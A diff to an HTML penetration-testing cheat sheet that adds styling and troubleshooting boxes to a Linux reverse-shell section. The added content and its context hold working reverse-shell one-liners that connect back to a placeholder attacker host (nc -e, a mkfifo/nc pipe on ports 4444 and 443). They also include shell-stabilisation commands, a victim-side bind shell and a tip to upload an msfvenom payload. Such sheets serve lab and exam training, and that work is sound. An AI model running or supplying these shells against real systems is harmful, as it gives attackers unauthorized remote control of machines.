@@ -94,6 +94,18 @@
     /* FOOTER */
     footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
 
+    /* SIGNAL BOX — new format */
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
+    /* MOVE ON BOX */
+    .moveon { background: #f8514908; border: 1px solid #f8514955; border-left: 3px solid var(--red); border-radius: 6px; padding: 10px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.75; }
+    .moveon-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); margin-bottom: 7px; display: block; }
+    .moveon-item { color: var(--muted); display: block; padding-left: 0.5em; }
+    .moveon-item::before { content: "✗ "; color: var(--red); }
     /* COPY JS */
   </style>
   <script>
@@ -158,6 +170,26 @@ nc -e /bin/bash &lt;KALI&gt; 4444
 
 <span class="c"># nc without -e (busybox/Alpine):</span>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc &lt;KALI&gt; 4444 &gt;/tmp/f</pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> Shell connects but immediately dies / no prompt</span>
+          <span class="sig-cmd">python3 -c 'import pty;pty.spawn("/bin/bash")' <span class="sig-note">-- stabilize immediately</span></span>
+          <span class="sig-cmd">export TERM=xterm && stty raw -echo; fg <span class="sig-note">-- full TTY after Ctrl+Z backgrounding</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> bash one-liner hangs — no connection received on nc</span>
+          <span class="sig-cmd">rlwrap nc -lvnp 443 <span class="sig-note">-- switch to port 443, outbound 4444 may be filtered</span></span>
+          <span class="sig-cmd">python3 -c 'import socket...' <span class="sig-note">-- try python3 if bash /dev/tcp blocked</span></span>
+          <span class="sig-cmd">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc &lt;KALI&gt; 443 >/tmp/f <span class="sig-note">-- mkfifo if nc -e not available</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on when</span>
+        <span class="moveon-item">bash + python + perl + nc all tried on ports 4444 and 443 — no connection</span>
+        <span class="moveon-item">upload msfvenom ELF as last resort before giving up on rev shell</span>
+        <span class="moveon-item">all outbound filtered — use bind shell: nc -lvnp 4444 -e /bin/bash on victim</span>
+      </div>
     </section>
 
     <section class="sec" id="win-shells">
